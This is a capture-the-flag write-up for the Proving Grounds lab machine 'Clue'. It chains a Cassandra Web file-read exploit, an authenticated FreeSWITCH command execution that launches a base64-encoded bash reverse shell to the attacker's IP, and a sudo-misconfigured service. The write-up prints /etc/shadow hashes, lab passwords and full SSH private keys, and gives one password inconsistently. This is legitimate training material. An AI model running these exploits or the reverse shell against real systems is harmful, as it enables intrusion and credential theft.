---
machine: Clue
platform: Proving Grounds
category: Linux
difficulty: Insane
tags: [lfi, cassandra, freeswitch, sudo-misconfiguration, ssh-key-theft]
date: 2026-08-18
status: retired
summary: A Debian box running a Cassandra database front-end alongside FreeSWITCH — testing an unauthenticated local-file-read vulnerability in the database web UI to harvest a service password, an authenticated telephony-platform exploit for an initial foothold, and a chain of leaked SSH keys and a sudo-permitted binary to pivot all the way to root.
---

## Enumeration

nmap scan:

```bash
──(kali㉿kali)-[~/oscp/clue/nmapscan]
└─$ nmap-full target
[*] Running fast port discovery on target...
[sudo] password for kali: 
[*] Open ports: 22,80,139,445,3000,8021
[*] Running full scan on target...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 19:11 -0400
Nmap scan report for target (192.168.245.240)
Host is up (0.038s latency).

PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m01s, deviation: 2h18m36s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2026-08-18T19:12:02-04:00
| smb2-time: 
|   date: 2026-08-18T23:12:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.75 seconds
```

```bash
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                             
S-1-22-1-1000 Unix User\cassie (Local User) 
S-1-22-1-1001 Unix User\anthony (Local User)
```

On port 3000 /hosts we have:

```json
[
  {
    "ip": "127.0.0.1",
    "id": "39c6f1e3-d798-44ce-b216-ce0f664fc0af",
    "datacenter": "datacenter1",
    "rack": "rack1",
    "release_version": "3.11.13",
    "status": "up"
  }
]
```

Maybe credential `Datacenter: datacenter1`?

We see our webapp on 3000 is running Cassandra Web:

```bash
──(kali㉿kali)-[~/oscp/clue]
└─$ searchsploit cassandra
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Atrium Software Cassandra NNTP Server 1.10 - Buffer Overflow                                                          | windows/dos/19884.txt
Cassandra Web 0.5.0 - Remote File Read                                                                                | linux/webapps/49362.py
```

We can use the latter exploit to LFI:

```bash
┌──(kali㉿kali)-[~/oscp/clue]
└─$ python3 49362.py 192.168.245.240 -p 3000 /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```

We can research cred files for freeswitch:

```bash
┌──(kali㉿kali)-[~/oscp/clue]
└─$ python3 49362.py 192.168.245.240 -p 3000 /etc/freeswitch/autoload_configs//event_socket.conf.xml

<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```

We find password `StrongClueEight021`

## Foothold

We can use this with our modified authenticated-rce freeswitch script to get a foothold:

```bash
┌──(kali㉿kali)-[~/oscp/clue]
└─$ python3 47799.txt 192.168.245.240 whoami StrongClueConEight021
Authenticated
Content-Type: api/response
Content-Length: 11

freeswitch
```

```bash
──(kali㉿kali)-[~/oscp/clue]
└─$ python3 47799.txt 192.168.245.240 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTUxLzgwIDA+JjE= | base64 -d | bash' StrongClueConEight021
Authenticated

┌──(kali㉿kali)-[~/oscp/clue]
└─$ sudo penelope -p 80
[sudo] password for kali: 
[+] Listening for reverse shells on 0.0.0.0:80 -> 127.0.0.1 • 10.0.2.15 • 192.168.45.151
freeswitch@clue:/$ whoami
freeswitch
```

We can get the local.txt from `/var/lib/freeswitch`:

```bash
freeswitch@clue:/var/lib/freeswitch$ cat local.txt 
efb36cc12817f91aa1ff64...
```

We also find an unreadable ssh key in cassie's home directory and write access to cassandra:

```bash
freeswitch@clue:/var/lib$ ls -lah
total 132K
drwxr-xr-x 33 root       root       4.0K Aug  5  2022 .
drwxr-xr-x 12 root       root       4.0K Aug  5  2022 ..
drwxr-xr-x  5 root       root       4.0K Aug  5  2022 apache2
drwxr-xr-x  5 root       root       4.0K Aug  5  2022 apt
drwxr-xr-x  2 root       root       4.0K Oct 20  2020 aspell
drwxr-xr-x  6 cassandra  cassandra  4.0K Aug  5  2022 cassandra
drwxr-xr-x  2 root       root       4.0K Oct 20  2020 dbus
drwxr-xr-x  2 root       root       4.0K Oct 20  2020 dhcp
drwxr-xr-x  4 root       root       4.0K Oct 20  2020 dictionaries-common
drwxr-xr-x  7 root       root       4.0K Aug  5  2022 dpkg
drwxr-xr-x  3 root       root       4.0K Oct 20  2020 emacsen-common
drwxr-xr-x  6 freeswitch freeswitch 4.0K Aug 11  2022 freeswitch
```

We can find internally hosted ports:

```bash
freeswitch@clue:/srv/samba/backup/cassandra/etc/cassandra$ ss -tulnp
Netid           State            Recv-Q            Send-Q                         Local Address:Port                        Peer Address:Port                                                                                                                                                                   
udp             UNCONN           0                 0                            192.168.245.240:123                              0.0.0.0:*                                                                                                                                                                      
udp             UNCONN           0                 0                                  127.0.0.1:123                              0.0.0.0:*                                                                                                                                                                      
udp             UNCONN           0                 0                                    0.0.0.0:123                              0.0.0.0:*                                                                                                                                                                      
tcp             LISTEN           0                 50                                   0.0.0.0:139                              0.0.0.0:*                                                                                                                                                                      
tcp             LISTEN           0                 50                                 127.0.0.1:38123                            0.0.0.0:*                                                                                                                                                                      
tcp             LISTEN           0                 128                                  0.0.0.0:80                               0.0.0.0:*                                                                                                                                                                      
tcp             LISTEN           0                 128                                127.0.0.1:9042                             0.0.0.0:*                                                                                                                                                                      
tcp             LISTEN           0                 5                                    0.0.0.0:8021                             0.0.0.0:*               users:(("ss",pid=2612,fd=4),("bash",pid=2227,fd=4),("python3",pid=2226,fd=4),("bash",pid=2200,fd=4),("bash",pid=2199,fd=4),("sh",pid=2196,fd=4),("freeswitch",pid=522,fd=4))
tcp             LISTEN           0                 128                                  0.0.0.0:22                               0.0.0.0:*                                                                                                                                                                      
tcp             LISTEN           0                 100                                  0.0.0.0:3000                             0.0.0.0:*                                                                                                                                                                      
tcp             LISTEN           0                 128                                127.0.0.1:7000                             0.0.0.0:*                                                                                                                                                                      
tcp             LISTEN           0                 50                                   0.0.0.0:445                              0.0.0.0:*                                                                                                                                                                      
tcp             LISTEN           0                 50                                 127.0.0.1:7199                             0.0.0.0:* 
```

Potential creds:

```bash
freeswitch@clue:/srv/samba/backup/cassandra/etc/cassandra$ grep -Ri pass
cassandra.yaml:# PasswordAuthenticator}.
cassandra.yaml:# - PasswordAuthenticator relies on username/password pairs to authenticate
cassandra.yaml:#   users. It keeps usernames and hashed passwords in system_auth.roles table.
cassandra.yaml:#   If using PasswordAuthenticator, CassandraRoleManager must also be used (see below)
cassandra.yaml:# the provided PasswordAuthenticator implementation of IAuthenticator. If
cassandra.yaml:# The passwords used in these options must match the passwords used when generating
cassandra.yaml:    keystore_password: cassandra
cassandra.yaml:    truststore_password: cassandra
cassandra.yaml:    keystore_password: cassandra
cassandra.yaml:    # Set trustore and truststore_password if require_client_auth is true
cassandra.yaml:    # truststore_password: cassandra
cassandra.yaml:            keystore_password: cassandra
cassandra.yaml:            key_password: cassandra
cassandra-env.sh:# Here we create the arguments that will get passed to the jvm when
cassandra-env.sh:  #JVM_OPTS="$JVM_OPTS -Djavax.net.ssl.keyStorePassword=<keystore-password>"
cassandra-env.sh:  #JVM_OPTS="$JVM_OPTS -Djavax.net.ssl.trustStorePassword=<truststore-password>"
cassandra-env.sh:JVM_OPTS="$JVM_OPTS -Dcom.sun.management.jmxremote.password.file=/etc/cassandra/jmxremote.password"

```

Auth to cqlsh db:

```bash
freeswitch@clue:/srv/samba/backup/cassandra/etc/cassandra$ cat /etc/cassandra/jmxremote.password
cat: /etc/cassandra/jmxremote.password: No such file or directory
freeswitch@clue:/srv/samba/backup/cassandra/etc/cassandra$ cqlsh -u cassandra -p cassandra
Connected to Test Cluster at 127.0.0.1:9042.
[cqlsh 5.0.1 | Cassandra 3.11.13 | CQL spec 3.4.4 | Native protocol v4]
Use HELP for help.

```

We can get the following from dumping the system_auth.roles:

```bash
cassandra@cqlsh> SELECT * FROM system_auth.roles;

 role      | can_login | is_superuser | member_of | salted_hash
-----------+-----------+--------------+-----------+--------------------------------------------------------------
 cassandra |      True |         True |      null | $2a$10$7pc1aRzw8A/aIDt.m8NJJeJeXvf3edjTMiLKiX/chjpe3v0sv85tS
    cassie |      True |        False |      null | $2a$10$7tFiSzsoqv7rTTLsT1hJHeNYHHghHLabLVHSkxLjISefFQnYCO.zG
```

We can't crack cassie's hash but we do remember that the LFI exploit we have runs as cassie! We can read the id_rsa ssh private key in the non-traditional location of /home/cassie/id_rsa:

```bash
┌──(kali㉿kali)-[~/oscp/clue]
└─$ python3 49362.py 192.168.245.240 -p 3000 /home/cassie/id_rsa                                    

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

### LFI on Linux to Password with /proc/self/cmdline

```text
**`/proc/self/cmdline`** is a special file in the Linux **`/proc`** filesystem that contains the **command line arguments** passed to the currently running process. 

The path `/proc/self` is a symbolic link that dynamically resolves to the **process directory** of the process currently accessing it, allowing a program to retrieve information about itself without needing to know its own Process ID (PID).
```

```bash
┌──(kali㉿kali)-[~/oscp/clue]
└─$ python3 49362.py 192.168.245.240 -p 3000 /proc/self/cmdline 

/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

We can su into cassie and use this password:

```bash
freeswitch@clue:/$ ls
bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
freeswitch@clue:/$ su cassie
Password: 
cassie@clue:/$ 
```

## Privilege Escalation

We find we can run cassandra-web as sudo:

```bash
cassie@clue:/dev/shm$ sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
```

We run a sudo instance of the cassandra-web on internal port 8888:

```bash
cassie@clue:/$ sudo cassandra-web -B 0.0.0.0:8888 -u cassie -p SecondBiteTheApple330
I, [2026-08-18T21:11:08.693690 #3305]  INFO -- : Establishing control connection
I, [2026-08-18T21:11:08.776539 #3305]  INFO -- : Refreshing connected host's metadata
I, [2026-08-18T21:11:08.782101 #3305]  INFO -- : Completed refreshing connected host's metadata
I, [2026-08-18T21:11:08.782946 #3305]  INFO -- : Refreshing peers metadata
I, [2026-08-18T21:11:08.784381 #3305]  INFO -- : Completed refreshing peers metadata
I, [2026-08-18T21:11:08.784437 #3305]  INFO -- : Refreshing schema
I, [2026-08-18T21:11:08.817759 #3305]  INFO -- : Schema refreshed
I, [2026-08-18T21:11:08.817846 #3305]  INFO -- : Control connection established
I, [2026-08-18T21:11:08.818146 #3305]  INFO -- : Creating session
I, [2026-08-18T21:11:08.936790 #3305]  INFO -- : Session created
2026-08-18 21:11:08 -0400 Thin web server (v1.8.1 codename Infinite Smoothie)
2026-08-18 21:11:08 -0400 Maximum connections set to 1024
2026-08-18 21:11:08 -0400 Listening on 0.0.0.0:8888, CTRL+C to stop
```

We port over the lfi exploit to cassie /dev/shm via copy paste and nano and can do LFI as root:

```bash
cassie@clue:/dev/shm$ python3 reallfi.py 127.0.0.1 -p 8888 /etc/shadow

root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5iPSpNxamM38BL85BPmaIAWp05VlV.tdq0EryiFLbLryvbsGTx50dLnMsxIk7PJB5P1:19209:0:99999:7:::
daemon:*:18555:0:99999:7:::
bin:*:18555:0:99999:7:::
sys:*:18555:0:99999:7:::
sync:*:18555:0:99999:7:::
games:*:18555:0:99999:7:::
man:*:18555:0:99999:7:::
lp:*:18555:0:99999:7:::
mail:*:18555:0:99999:7:::
news:*:18555:0:99999:7:::
uucp:*:18555:0:99999:7:::
proxy:*:18555:0:99999:7:::
www-data:*:18555:0:99999:7:::
backup:*:18555:0:99999:7:::
list:*:18555:0:99999:7:::
irc:*:18555:0:99999:7:::
gnats:*:18555:0:99999:7:::
nobody:*:18555:0:99999:7:::
_apt:*:18555:0:99999:7:::
systemd-timesync:*:18555:0:99999:7:::
systemd-network:*:18555:0:99999:7:::
systemd-resolve:*:18555:0:99999:7:::
messagebus:*:18555:0:99999:7:::
sshd:*:18555:0:99999:7:::
systemd-coredump:!!:18555::::::
ntp:*:19209:0:99999:7:::
cassandra:!:19209:0:99999:7:::
cassie:$6$/WeFDwP1CNIN34/z$9woKSLSZhgHw1mX3ou90wnR.i5LHEfeyfHbxu7nYmaZILVrbhHrSeHNGqV0WesuQWGIL7DHEwHKOLK6UX79DI0:19209:0:99999:7:::
freeswitch:!:19209::::::
anthony:$6$01NV0gAhVLOnUHb0$byLv3N95fqVvhut9rbsrYOVzi8QseWfkFl7.VDQ.26a.0IkEVR2TDXoTv/KCMLjUOQZMMpkTUdC3WIyqSWQ.Y1:19209:0:99999:7:::
```

We use the root LFI to read /home/anthony/.bash_history

```bash
cassie@clue:/dev/shm$ python3 lfi.py 127.0.0.1 -p 8888 /home/anthony/.bash_history

clear
ls -la
ssh-keygen
cp .ssh/id_rsa.pub .ssh/authorized_keys
sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys
exit
```

Inside Anthony's .bash_history we see that Anthony's private SSH key was copied to roots authorized_keys:

```bash
cassie@clue:/dev/shm$ python3 lfi.py 127.0.0.1 -p 8888 /home/anthony/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

We can LFI down Anthony's private key and use it against root

```bash
┌──(kali㉿kali)-[~/oscp/clue]
└─$ nano anthony.priv

┌──(kali㉿kali)-[~/oscp/clue]
└─$ chmod 700 anthony.priv 

┌──(kali㉿kali)-[~/oscp/clue]
└─$ ssh -i anthony.priv root@192.168.107.240
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 29 17:57:54 2024
root@clue:~# 
```

We finally have root and the box is compromised. We can retrieve the proof.txt from the /root directory.

```bash
root@clue:~# cd /root/
root@clue:~# ls
proof.txt  proof_youtriedharder.txt  smbd.sh
root@clue:~# cat proof.txt
The proof is in another file
root@clue:~# cat proof_youtriedharder.txt 
8860e624965...
```
